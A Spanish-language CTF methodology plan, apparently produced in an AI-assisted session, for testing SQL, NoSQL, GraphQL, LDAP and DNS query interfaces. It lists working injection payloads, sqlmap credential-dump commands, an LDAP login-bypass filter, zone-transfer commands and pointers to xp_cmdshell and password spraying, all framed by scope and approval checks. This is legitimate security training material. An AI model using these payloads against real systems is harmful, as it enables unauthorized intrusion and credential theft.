# Plan de análisis 05 — Bases de datos y consultas

- **Punto de vista:** examina las interfaces de consulta del objetivo: parámetros que terminan en una consulta SQL o NoSQL, filtros LDAP, consultas GraphQL, endpoints de búsqueda y el DNS como base de datos pública. En un CTF, la mayoría de los fallos de datos (login bypass, dump de credenciales, IDOR, exposición de esquema) nacen de cómo la aplicación construye o restringe estas consultas. Este plan se centra en detectar la inyección y en extraer datos de forma controlada, sin salirse del alcance.
- **Cuándo aplicarlo:** señales del reto:
  - Formularios de login o búsqueda, y parámetros `id=`, `user=`, `search=`, `sort=`.
  - Cuerpos JSON con operadores o nombres de campo que sugieran Mongo (`$`, `_id`).
  - Errores de SQL visibles, comillas que cambian la respuesta, o respuestas que varían con condiciones.
  - Endpoints `/graphql`, `/api`, `/api/graphql`.
  - Servicios en el puerto 389/636 (LDAP) o 53 (DNS), o un dominio con NS accesibles.
  - Un dominio del reto con subdominios o zonas que podrían estar mal configuradas.

## Preparación
- **Autorización:** el objetivo debe figurar en un `ctf/SCOPE.md` confirmado antes de ejecutar nada. Este plan es solo metodología.
- **Acceso:** la IP o dominio del reto, y si aplica, credenciales de prueba. Trabaja con una cuenta propia si el reto la proporciona.
- **Entorno:**
  - Windows nativo: PowerShell, `curl.exe` (incluido en Windows 10 y 11), `nslookup`, Python 3 para sqlmap, Burp Suite o un proxy equivalente.
  - Kali o WSL: `dig` (paquete `dnsutils` o `bind9-dnsutils`), `ldapsearch` (paquete `ldap-utils`), sqlmap, nmap, y herramientas de NoSQL o GraphQL.
- **Organización:** guarda las peticiones de referencia (`req.txt`, `body.json`) en el scratchpad, no en el repositorio. Anota cada respuesta base (longitud, código, texto de error) antes de inyectar nada, para poder comparar.
- **Nota de fuentes:** las páginas de HackTricks (NoSQL, LDAP, DNS) devolvieron HTTP 402 al consultarlas desde esta sesión, así que no se usan como evidencia. Los comandos de esas áreas están verificados con otras fuentes, o marcados como «no verificado».

## Herramientas
| Herramienta | Para qué | Nativo Windows / Kali-WSL |
|---|---|---|
| sqlmap | Detección y explotación automatizada de SQLi, extracción de datos. Docs oficiales: "funciona con Python 2.7 y 3.x en cualquier plataforma" | Windows: sí, con Python 3 (`python sqlmap.py`). Kali: paquete `sqlmap` |
| curl.exe | Peticiones manuales con control de cabeceras y cuerpo | Windows: sí (incluido). Kali/WSL: sí |
| Burp Suite (Repeater, Intruder) | Modificar peticiones y comparar respuestas a mano | Ambos (no verificado en esta sesión) |
| nosqlmap | Automatiza pruebas de NoSQL injection (MongoDB) | Kali/WSL preferible (no verificado en esta sesión) |
| InQL / Clairvoyance | Introspección GraphQL y reconstrucción de esquema si la introspección está desactivada (Clairvoyance mencionado en la guía de PortSwigger) | Kali/WSL preferible (no verificado en esta sesión) |
| dig | Consultas DNS, AXFR, PTR, NS | Windows: no nativo. Kali/WSL: sí (`dig`) |
| nslookup | Consultas DNS y subcomando `ls` (transferencia de zona en modo interactivo) | Windows: sí (nativo). Kali/WSL: sí |
| nmap + NSE `dns-zone-transfer` | Transferencia de zona AXFR con script NSE | Ambos (instalador oficial para Windows) |
| ldapsearch | Consultas LDAP, bind anónimo, rootDSE | Windows: no nativo (alternativa: PowerShell con `System.DirectoryServices` o `ldp.exe` de RSAT, no verificado). Kali/WSL: sí (`ldap-utils`) |
| PowerShell (`Invoke-WebRequest`, `Resolve-DnsName`) | Alternativa nativa para peticiones HTTP y consultas DNS | Windows: sí |

## Procedimiento paso a paso

1. **Línea base de la interfaz.** Guarda la respuesta normal y la de un valor inválido. Compara código HTTP, longitud y contenido.
   ```powershell
   curl.exe -s -i "http://OBJETIVO/item?id=1" -o base.txt
   curl.exe -s -i "http://OBJETIVO/item?id=1'" -o err.txt
   ```
   Si `err.txt` muestra un error de SGBD o cambia el código, la entrada llega a una consulta.

2. **Prueba booleana de SQLi.** Compara respuestas con condición verdadera y falsa. Usa `--` con espacio final en MySQL o `-- -` en los casos que lo requieran.
   ```powershell
   curl.exe -s "http://OBJETIVO/item?id=1 AND 1=1-- -"
   curl.exe -s "http://OBJETIVO/item?id=1 AND 1=2-- -"
   ```
   Si las respuestas difieren, hay inyección booleana (fuente: PortSwigger, «How to detect SQL injection vulnerabilities»).

3. **Prueba de sintaxis en JSON/NoSQL.** En un login JSON, prueba si los operadores se interpretan.
   ```powershell
   curl.exe -s -X POST http://OBJETIVO/login -H "Content-Type: application/json" -d "{\"username\":\"wiener\",\"password\":{\"$ne\":\"x\"}}"
   ```
   Si la respuesta cambia respecto a una contraseña incorrecta, el operador `$ne` se interpreta. Para pruebas largas, usa un archivo: `curl.exe -X POST ... -d @body.json`. Con condiciones de sintaxis, compara `' && 0 && 'x` frente a `' && 1 && 'x` (PortSwigger, «NoSQL injection»).

4. **Operador en parámetros de URL (NoSQL).** Si el backend acepta `username[$ne]=x`, prueba en GET antes de cambiar a JSON.
   ```powershell
   curl.exe -s "http://OBJETIVO/login?username[$ne]=x&password[$ne]=x"
   ```
   Si no funciona, convierte a POST JSON (PortSwigger, «NoSQL injection»).

5. **Detección de SQLi por tiempo** (cuando no hay diferencia visible). Usa el retardo del SGBD identificado. Ejemplos del PortSwigger Cheat Sheet:
   ```
   MySQL:      1 AND IF(1=1,SLEEP(5),'a')-- -
   PostgreSQL: 1; SELECT pg_sleep(5)--
   MSSQL:      1; WAITFOR DELAY '0:0:5'--
   ```
   Mide el tiempo con `Measure-Command { curl.exe -s "..." }` en PowerShell.

6. **Automatizar con sqlmap.** Carga la petición capturada desde Burp en un archivo (`req.txt`) para evitar problemas de escape en la línea de comandos.
   ```powershell
   python sqlmap.py -r req.txt --batch --level=3 --risk=2 --technique=BEUST
   ```
   `--level` y `--risk` amplían los payloads (fuente: sqlmap wiki, «Usage»). Si sabes el SGBD, agrega `--dbms=mysql` (o el que corresponda).

7. **Enumerar la base de datos con sqlmap.** Ve de lo general a lo particular.
   ```powershell
   python sqlmap.py -r req.txt --batch --current-user --current-db
   python sqlmap.py -r req.txt --batch --dbs
   python sqlmap.py -r req.txt --batch -D NOMBRE_BD --tables
   python sqlmap.py -r req.txt --batch -D NOMBRE_BD -T users --columns
   python sqlmap.py -r req.txt --batch -D NOMBRE_BD -T users -C username,password --dump
   ```
   Limita `--dump` a las columnas necesarias. El dump completo puede exponer datos fuera del alcance del reto.

8. **Si hay WAF o filtro.** Prueba `--tamper` con scripts de la lista de sqlmap (p. ej. `space2comment`, `between`). Documenta qué script funcionó (fuente: sqlmap wiki, opción `--tamper`).

9. **SQLi manual con UNION** (cuando sqlmap no basta o se quiere controlar la salida). Primero cuenta columnas. Con `ORDER BY` (práctica habitual, no verificado en esta sesión):
   ```
   ' ORDER BY 1-- -
   ' ORDER BY 2-- -
   ' UNION SELECT NULL,NULL-- -
   ```
   Después extrae metadatos. Por SGBD (PortSwigger Cheat Sheet):
   ```
   MySQL/PostgreSQL: SELECT version()        | SELECT table_name FROM information_schema.tables
   MSSQL:            SELECT @@version        | SELECT table_name FROM information_schema.tables
   Oracle:           SELECT banner FROM v$version | SELECT table_name FROM all_tables
   ```

10. **Blind SQLi carácter a carácter.** Con una respuesta booleana, usa `SUBSTRING` (en Oracle, `SUBSTR`) y compara por rangos (fuente: PortSwigger, «Blind SQL injection»):
    ```
    ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m'-- -
    ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='s'-- -
    ```
    Acota con `>` y confirma con `=`. Repite por posición.

11. **Exfiltración fuera de banda** (si la respuesta no varía). En MSSQL, la fuente muestra `xp_dirtree` para generar una consulta DNS hacia un dominio controlado por el atacante (PortSwigger, «Blind SQL injection»). Requiere un servidor DNS de prueba autorizado.

12. **NoSQL: extracción booleana por `$regex`.**
    ```json
    {"username":"admin","password":{"$regex":"^a.*"}}
    ```
    Repite con `^ab.*`, `^abc.*`, etc. Una respuesta distinta a la de contraseña incorrecta confirma el carácter (fuente: HackTricks vía PortSwigger, sin verificar el texto original de HackTricks).

13. **GraphQL: confirmar y listar el esquema.**
    ```powershell
    curl.exe -s -X POST http://OBJETIVO/graphql -H "Content-Type: application/json" -d "{\"query\":\"{__typename}\"}"
    curl.exe -s -X POST http://OBJETIVO/graphql -H "Content-Type: application/json" -d "{\"query\":\"{__schema{queryType{name} types{name}}}\"}"
    ```
    Si el primer comando devuelve `{"data":{"__typename":"query"}}`, es GraphQL. Si la introspección falla, prueba variantes con espacios o saltos de línea tras `__schema` (fuente: PortSwigger, «GraphQL»). Después prueba IDOR con argumentos: `product(id: 3)` frente a la lista pública.

14. **GraphQL: aliases para fuerza bruta** cuando hay limitación por petición HTTP (PortSwigger, «GraphQL»):
    ```graphql
    query { a: login(user:"admin", pass:"p1") { token } b: login(user:"admin", pass:"p2") { token } }
    ```

15. **DNS: identificar servidores y zona.**
    ```bash
    dig @NS_DEL_OBJETIVO dominio.reto NS +short
    dig @NS_DEL_OBJETIVO dominio.reto SOA
    dig -x IP_OBJETIVO +noall +answer
    ```
    `-x` hace búsqueda inversa PTR (fuente: man de dig, OpenBSD).

16. **DNS: transferencia de zona (AXFR).**
    ```bash
    dig @NS_DEL_OBJETIVO dominio.reto -t AXFR
    ```
    La transferencia usa TCP (fuente: man de dig). En Windows:
    ```cmd
    nslookup
    > server NS_DEL_OBJETIVO
    > ls -d dominio.reto
    ```
    `ls` lista la zona en modo interactivo (fuente: Microsoft Learn, «nslookup»). Alternativa con nmap:
    ```bash
    nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=dominio.reto -p 53 NS_DEL_OBJETIVO
    ```
    (fuente: nmap NSE docs).

17. **LDAP: bind anónimo y rootDSE.** Obtén los contextos de nombres y comprueba si hay acceso anónimo.
    ```bash
    ldapsearch -x -H ldap://OBJETIVO -b "" -s base -LLL "(objectClass=*)" namingContexts
    ldapsearch -x -H ldap://OBJETIVO -b "dc=reto,dc=local" -s sub -LLL "(objectClass=*)" | head -n 100
    ```
    La primera línea pide `namingContexts` (práctica habitual, no verificado en esta sesión). La opción `-x -H -D -W -b -s -LLL` está verificada en la man page de OpenLDAP.

18. **LDAP: inyección en filtros.** Prueba con caracteres especiales en el campo de usuario y observa cambios en la respuesta: `*`, `(`, `)`, `\`. Un filtro como `(uid=INPUT)` que no escapa la entrada puede aceptar `*` como comodín. Patrón clásico de bypass de login (práctica habitual, no verificado en fuente): `*)(uid=*))(|(uid=*`. Escapes válidos para valores literales (RFC 4515): `\2a` (`*`), `\28` (`(`), `\29` (`)`), `\5c` (`\`), `\00` (NUL). Por ejemplo, `(cn=*\2A*)` busca un asterisco literal.

## Qué buscar (indicadores de vulnerabilidad)
- **SQLi:** comilla simple que produce error de SGBD, o cambia el código HTTP; diferencias de respuesta entre `AND 1=1` y `AND 1=2`; retardos que coinciden con `SLEEP`, `pg_sleep` o `WAITFOR`.
- **NoSQL:** un campo JSON que acepta objetos (`{"$ne":...}`) en lugar de cadenas; un parámetro de URL que se transforma en `username[$ne]`; respuestas distintas con `$regex`.
- **Exposición de datos:** errores con rutas, nombres de tabla o versiones; `information_schema` accesible; esquema GraphQL completo con campos internos (email, IDs, flags); IDOR con IDs secuenciales.
- **LDAP:** bind anónimo permitido; `namingContexts` visible; filtros que devuelven más entradas al introducir `*`.
- **DNS:** transferencia AXFR permitida desde Internet; NS que responden a `ANY` o `SOA` de forma inesperada; registros PTR que revelan nombres internos.

## Cómo interpretar y pasar a explotación
- **Error o diferencia booleana en un login** → auth bypass con `' OR 1=1-- -` o con `$ne` en JSON. Verifica el acceso con la respuesta autenticada y sigue por la cuenta obtenida.
- **Columnas de usuarios y contraseñas** → dump de credenciales (sqlmap `--dump` limitado a `username,password`). Prueba las credenciales en otros servicios del reto. Si el hash no es texto plano, identifica el algoritmo antes de crackear.
- **`--os-shell` o `xp_cmdshell` disponible** (MSSQL) → ejecución de comandos en el servidor. Sube a RCE solo si el reto lo requiere y está dentro del alcance; documenta el vector.
- **Regex carácter a carácter en NoSQL o booleana en SQL** → extracción de un valor concreto (flag o contraseña de admin). Automatiza con un script en el scratchpad, con una respuesta de referencia para comparar.
- **GraphQL con introspección** → mapear mutaciones y campos ocultos. Una mutación sin autorización lleva a escalada o IDOR.
- **AXFR exitosa** → lista de hosts internos del dominio. Esos hosts son nuevos objetivos de otros planes de análisis, siempre dentro del alcance.
- **LDAP anónimo con datos** → lista de usuarios y grupos. Los usuarios sirven para password spraying (solo dentro del alcance) y para buscar atributos como `description` o `userPassword`.

## Errores comunes y trampas
- Inyectar sin línea base: sin comparar con la respuesta normal, es fácil confundir ruido con inyección.
- Usar `--level` y `--risk` altos sin control: generan mucho tráfico y pueden tocar `UPDATE` o `DELETE`. Las fuentes de PortSwigger advierten del riesgo de pérdida de datos con condiciones siempre verdaderas en operaciones de escritura.
- Comentarios incorrectos por SGBD: `--` en MySQL requiere espacio final; `#` sirve en MySQL; `/* */` funciona en la mayoría.
- Escapes de PowerShell al pasar JSON en la línea de comandos: usa `-d @body.json` en lugar de comillas anidadas.
- `dig` no existe en Windows nativo; `nslookup` no soporta todas las opciones de `dig`.
- Las transferencias de zona suelen estar bloqueadas. Un fallo de AXFR no prueba que no haya zona expuesta: prueba también con cada NS que aparezca en la delegación.
- LDAP: `ldapsearch` exige el DN correcto en `-D`; un bind anónimo puede devolver vacío aunque el servidor funcione.
- No extraer más de lo necesario: limita dumps a las columnas y filas del objetivo del reto.
- Las referencias de HackTricks no se pudieron consultar desde esta sesión (HTTP 402). Verifica sus payloads antes de usarlos.

## Fuentes
- SQL Injection — PortSwigger Web Security Academy — https://portswigger.net/web-security/sql-injection
- Blind SQL injection — PortSwigger Web Security Academy — https://portswigger.net/web-security/sql-injection/blind
- SQL injection cheat sheet — PortSwigger Web Security Academy — https://portswigger.net/web-security/sql-injection/cheat-sheet
- NoSQL injection — PortSwigger Web Security Academy — https://portswigger.net/web-security/nosql-injection
- GraphQL — PortSwigger Web Security Academy — https://portswigger.net/web-security/graphql
- LDAP Injection — OWASP Community — https://community.owasp.org/attacks/LDAP_Injection
- sqlmap Usage (wiki) — sqlmap project — https://github.com/sqlmapproject/sqlmap/wiki/Usage
- sqlmap (repositorio, requisitos Python) — sqlmap project — https://github.com/sqlmapproject/sqlmap
- dig (man page) — OpenBSD — https://man.openbsd.org/dig
- nslookup — Microsoft Learn — https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup
- ldapsearch (man page) — OpenLDAP — https://www.openldap.org/software/man.cgi?query=ldapsearch
- dns-zone-transfer (NSE) — Nmap — https://nmap.org/nsedoc/scripts/dns-zone-transfer.html
- RFC 4515, Lightweight Directory Access Protocol: String Representation of Search Filters — IETF — https://datatracker.ietf.org/doc/html/rfc4515

Fuentes no consultadas con éxito (no citadas como evidencia): HackTricks (NoSQL, LDAP, DNS) y OWASP SQL Injection (redirigido, sin contenido).

## Relación con otros planes
- `04-aplicaciones-web.md`: formularios, cabeceras y sesiones que alimentan las consultas.
- `01-reconocimiento.md` (si existe): descubrimiento de hosts, puertos 53/389/636 y endpoints.
- `02-servicios-red.md` (si existe): explotación de servicios LDAP y DNS fuera de la aplicación web.
- `06-*` y siguientes: se completarán según los planes de la biblioteca `analisis/`.

## Autorización
Es metodología. Aplícala a un objetivo solo si figura en un `ctf/SCOPE.md` confirmado. Ninguna recomendación de este plan se ejecuta sin esa confirmación. Las acciones de explotación, como dumps, bypass o transferencias, son propuestas pendientes de aprobación del usuario.
